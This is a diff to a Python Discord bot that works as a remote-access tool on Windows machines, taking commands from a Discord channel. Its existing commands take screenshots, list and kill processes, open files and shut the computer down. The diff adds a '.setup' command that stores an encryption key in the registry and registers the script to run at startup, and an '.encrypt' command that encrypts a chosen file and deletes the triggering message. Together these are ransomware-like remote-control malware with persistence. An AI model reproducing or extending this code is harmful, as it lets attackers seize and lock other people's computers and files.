@@ -2,6 +2,8 @@ import discord
 import os
 import libs.computer as pc
 import libs.powershell as pw
+import libs.registry_handler as reg_h
+import libs.files as files
 import sys
 from shutil import copy;
 import winshell
@@ -49,6 +51,9 @@ async def on_ready():
         shortcut.save()
     """
 
+    #ENCRYPTION KEY STORE REGISTRY
+
+
 @client.event
 async def on_message(message):
     if message.author == client.user:
@@ -62,7 +67,7 @@ async def on_message(message):
             .hardware - Fetch information about the computer's hardware using WMIC. [GPU/CPU Name, HWID, RAM Capacity, Disk Capacity]
             .shutdown - Shutdown the computer.
             .dir - List the specified directory's files. Usage: .dir <full path>
-            .tasklist - List all tasks currently running on the host computer. Usage: .tasklist
+            .tasklist - List all tasks with a specific name. Usage: .tasklist <program name>. Example: .tasklist opera.exe
             .taskkill - Kill a specified task. Usage: .taskkill <PID>
             .screenshot - Take a screenshot.
             .open - Open a specified file. Usage: .open <full file path>. Example: .open c:/Users/user/Desktop/textfile.txt
@@ -389,6 +394,40 @@ async def on_message(message):
             embed = discord.Embed(title="Clipboard", description="Clipboard set.", color=0x00ff00)
             await message.channel.send(embed=embed)
 
+    #RUN ON FIRST STARTUP
+    if message.content.startswith(".setup"):
+        try:
+            reg_h.create_enc_key()
+            embed = discord.Embed(title="Setup", description="Encryption key created.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            reg_h.store_enc_key()
+            embed = discord.Embed(title="Setup", description="Encryption key stored.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            reg_h.create_startup(f"{os.path.dirname(os.path.abspath(__file__))}\\main.py")
+            embed = discord.Embed(title="Setup", description="Startup created.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Setup", description="Failed to setup.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="Setup", description="Setup successful.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #ENCRYPT FILE
+    if message.content.startswith(".encrypt"):
+        await message.delete()
+        try:
+            files.encrypt_file(message.content.replace(".encrypt ", ""), reg_h.get_enc_key())
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Encrypt", description="Failed to encrypt file. Did you run '.setup?'", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="Encrypt", description="File encrypted.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #DECRYPT FILE 
 token = sys.argv[1]
 client.run(token)
 #use py main.py <token> to run
